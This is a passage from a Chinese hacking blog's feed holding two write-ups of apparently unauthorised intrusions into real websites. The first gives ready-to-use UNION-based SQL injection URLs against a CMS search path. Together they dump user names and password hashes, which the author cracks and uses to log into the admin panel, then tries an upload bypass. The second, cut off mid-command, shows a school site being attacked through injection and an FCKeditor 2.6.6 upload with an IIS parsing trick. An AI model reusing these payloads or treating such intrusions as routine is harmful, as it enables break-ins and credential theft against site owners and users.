alt="意外性的发现一套cms的注入漏洞"></p><p>继续翻其他站，在一个站的首页发现这个。</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/09.png" alt="意外性的发现一套cms的注入漏洞"></p><p>尝试下post注入。加个单引号</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10.png" alt="意外性的发现一套cms的注入漏洞"></p><p>好吧 刚准备放弃….过了几秒钟 自动跳转到到了另一个页面</p><p> <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/11.png" alt="意外性的发现一套cms的注入漏洞"></p><p>继续在搜索框那输入了些查询内容点击检索</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/12.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/13.png" alt="意外性的发现一套cms的注入漏洞"></p><p>Search后面多了个24，怪我手贱去加个个单引号………报错了（头一次人品爆发）</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/14.png" alt="意外性的发现一套cms的注入漏洞"></p><p>And 1=1 和and 1=2返回结果</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/15.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/16.png" alt="意外性的发现一套cms的注入漏洞"></p><p>确定已经存在注入，这次就用手工注入吧。</p><p>先order by猜下字段长度</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010">http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2010</a>  返回正常</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011">http://www.xxx.com/index.php/iss/search/search/24%20order%20by%2011</a> 返回错误</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10">http://www.xxx.com/index.php/iss/search/search/24%20union%20select%201,2,3,4,5,6,7,8,9,10</a>结果如下</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/17.png" alt="意外性的发现一套cms的注入漏洞"></p><p>没有显错位啊，加个and 1=2试试</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/18.png" alt="意外性的发现一套cms的注入漏洞"></p><p>显错位替换成database()和version()，版本是5.0以上，有个默认数据库information</p><p>   <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/19.png" alt="意外性的发现一套cms的注入漏洞"></p><p>User(),不是root权限</p><p>   <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/20.png" alt="意外性的发现一套cms的注入漏洞"></p><p>接下来查表名</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(table_name),3,4,5,6,7,8,9,10%20from%20information_schema.tables%20where%20table_schema=0x6462xxxxxxxxxxx70696E6B5F636F6D</a>(这是数据库的hex码，xxx代表马赛克……)</p><p>​    <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/21.png" alt="意外性的发现一套cms的注入漏洞"></p><p>出来很多啊，用审查元素全部复制下来</p><p>flexi_announcement,flexi_bbcode,flexi_channel,flexi_channel_config,flexi_config,flexi_content,flexi_content_subject,flexi_feedback,flexi_file,flexi_file_watermark,flexi_inquiry,flexi_link,flexi_link_category,flexi_log,flexi_message,flexi_page,flexi_search_cache,flexi_tag,flexi_tag_related,flexi_tpl_block,flexi_user,flexi_user_admin,flexi_u</p><p>起初以为是flexi_user_admin这个表，后来发现帐号密码存在flexi_user这个表中</p><p>接下来查他字段</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,group_concat(column_name),3,4,5,6,7,8,9,10%20from%20information_schema.columns%20where%20table_name=0x666C6578695F75736572</a></p><p>​    <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/22.png" alt="意外性的发现一套cms的注入漏洞"></p><p>id,name,password,hit_question,hit_answer,email,real_name,gender,birthday,province,address,post_code,phone_code,mphone_code,group_id,reg_time,last_login_time,last_login_ip,login_count,post_count,manager,locked,new_msg_count,memo</p><p>经验判断存放帐号密码的字段是name和password</p><p><a href="http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user">http://www.xxx.com/index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,password,9,10%20from%20flexi_user</a></p><p>​    <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/23.png" alt="意外性的发现一套cms的注入漏洞"></p><p>就这样，帐号密码已经出来了</p><p>利用构造出来的exp:</p><p><code>index.php/iss/search/search/24%20and%201=2%20union%20select%201,name,3,4,5,6,7,pass word,9,10%20from%20flexi_user</code></p><p>去主站访问下</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/24.png" alt="意外性的发现一套cms的注入漏洞"></p><p>哈哈  帐号密码到手 数了一下是40位…….然后去百度看了看</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/25.png" alt="意外性的发现一套cms的注入漏洞"></p><p>………..说是md5的  然后我仔细看了看文章…..屌用都没  我去官网下载了套源码</p><p>查看代码发现是sha1加密</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/26.png" alt="意外性的发现一套cms的注入漏洞"></p><p>拿起密码就去cmd5.com解密，悲剧来了………</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/27.png" alt="意外性的发现一套cms的注入漏洞"></p><p>Oh Fuck</p><p>试了试另外一个，也是一样的结果…..</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/28.png" alt="意外性的发现一套cms的注入漏洞"></p><p>然后看了看其他网站，可能真的人品爆发，有个站解密成功了</p><p>然后登录之。</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/29.png" alt="意外性的发现一套cms的注入漏洞"></p><p>大概看了看网站后台，在这添加上php</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/30.png" alt="意外性的发现一套cms的注入漏洞"></p><p>找到个上传文件的地方，感觉shell就在眼前</p><p>​     <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/31.png" alt="意外性的发现一套cms的注入漏洞"></p><p>点击上传发现…………我真是个命苦的人啊</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/32.png" alt="意外性的发现一套cms的注入漏洞"></p><p>只能拿出我苦练多年的打狗大法…….拿起burp抓包</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/33.png" alt="意外性的发现一套cms的注入漏洞"></p><p>在这里构造畸形的http，然后放包，成功上传。（自带滑稽表情）</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/34.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/35.png" alt="意外性的发现一套cms的注入漏洞"></p><p>点击那个放大镜</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/36.png" alt="意外性的发现一套cms的注入漏洞"></p><p>源码暴露了路径也不对劲…….看来不是他真实路径。</p><p>又翻了翻，发现这个，点击检索</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/37.png" alt="意外性的发现一套cms的注入漏洞"></p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/38.png" alt="意外性的发现一套cms的注入漏洞"></p><p>看到刚才上传的文件，点击源文件</p><p>路径变成了，多了个下划线…….</p><p><a href="http://www.xxx.com/data/upload/2017-04/08215611_edit._php">http://www.xxx.com/data/upload/2017-04/08215611_edit._php</a></p><p>这个问题卡了我两天，各种姿势都试了，还是没办法绕过。</p><p>所以放弃了。。。。。</p><p>Ps：这个提供这套cms的站点也存在该漏洞</p><p>  <img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171103_%E6%84%8F%E5%A4%96%E6%80%A7%E7%9A%84%E5%8F%91%E7%8E%B0%E4%B8%80%E5%A5%97cms%E7%9A%84%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/39.png" alt="意外性的发现一套cms的注入漏洞"></p>]]></content>
    
    
    <categories>
      
      <category>原创文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透实战</tag>
      
      <tag>原创文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>毫无技术含量的一次渗透</title>
    <link href="/p/3dc0c236.html"/>
    <url>/p/3dc0c236.html</url>
    
    <content type="html"><![CDATA[<p>马上就双十一了，发一篇去年双十一写的文章！图片太多，懒得打码了，一年过去了，漏洞没补也不怪我了吧。。。</p><p>事情是这样的，双十一大家都知道，有钱的都在买东西，没钱的都在借钱买东西。像我这种又丑又没钱的只能在聊 QQ……无意间在一个群里看到</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/01.png" alt="毫无技术含量的一次渗透"></p> <a id="more"></a><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/02.png" alt="毫无技术含量的一次渗透"></p><p>反正无聊，随手打开看看吧。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/03.png" alt="毫无技术含量的一次渗透"></p><p>看起来是个学校网站啊。说不定有妹子的资料啥的。看到那哥们说有马啥的。我就去打开链接看了看。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/04.png" alt="毫无技术含量的一次渗透"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/05.png" alt="毫无技术含量的一次渗透"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/06.png" alt="毫无技术含量的一次渗透"><br>好好好，你赢了，这都是啥屌东西啊~不过还真找到一个 d.asp 的马</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/07.png" alt="毫无技术含量的一次渗透"><br>先看看这马能不能溢出吧，毕竟别人的 shell 为啥不能占为己有呢</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/08.png" alt="毫无技术含量的一次渗透"><br>………溢出失败，还是别偷懒吧，一步步来。回到首页，随便打开一个链接。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/09.png" alt="毫无技术含量的一次渗透"><br>直觉告诉我，这屌地方有注入啊，加个‘试试。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/10.png" alt="毫无技术含量的一次渗透"><br>果然，报错了…..我也不装逼什么的手工注入了。果断丢进啊 d 神器中，毕竟还要去看片（正经片）。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/11.png" alt="毫无技术含量的一次渗透"><br>出来了，丢到 cmd5 去解密看看</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/12.png" alt="毫无技术含量的一次渗透"><br>穷逼买不起….竟然买不起就先找后台吧….找到以后再借钱去买吧…..<br>Admin 404</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/13.png" alt="毫无技术含量的一次渗透"></p><p>Login.asp 也是 404，算了，用御剑扫扫吧。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/14.png" alt="毫无技术含量的一次渗透"><br>看到前 3 条，有 fck 编辑器。那还是从这下手吧，毕竟能省下解密的钱。<br>看了下版本，是 2.6.6 的</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/15.png" alt="毫无技术含量的一次渗透"><br>2.6.6 版本的 fck 的上传页面</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/16.png" alt="毫无技术含量的一次渗透"><br>Ok，先来看看第一个</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/17.png" alt="毫无技术含量的一次渗透"><br>先查看下目录和文件</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/18.png" alt="毫无技术含量的一次渗透"><br>当前目录下什么都没有啊<br>然后随便上传一张图片看下能否上传吧。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/19.png" alt="毫无技术含量的一次渗透"><br>显示上传没有错误，那就是成功了啊！！！查看下</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/20.png" alt="毫无技术含量的一次渗透"><br>果然多出了一张图片，看来会自动重命名了，先访问试试</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/21.png" alt="毫无技术含量的一次渗透"><br>可以正常访问的，然后嘛，各种截断都没用</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/22.png" alt="毫无技术含量的一次渗透"><br>去查看服务器信息吧…</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/23.png" alt="毫无技术含量的一次渗透"><br>那就上解析漏洞吧<br>创建一个 ice.asp 的文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/24.png" alt="毫无技术含量的一次渗透"><br>我擦，变下划线了</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0/20171101_%E6%AF%AB%E6%97%A0%E6%8A%80%E6%9C%AF%E5%90%AB%E9%87%8F%E7%9A%84%E4%B8%80%E6%AC%A1%E6%B8%97%E9%80%8F/25.png" alt="毫无技术含量的一次渗透"><br>淡定，我记得这个是可以突破的….<br>构造下语句</p><p><code>  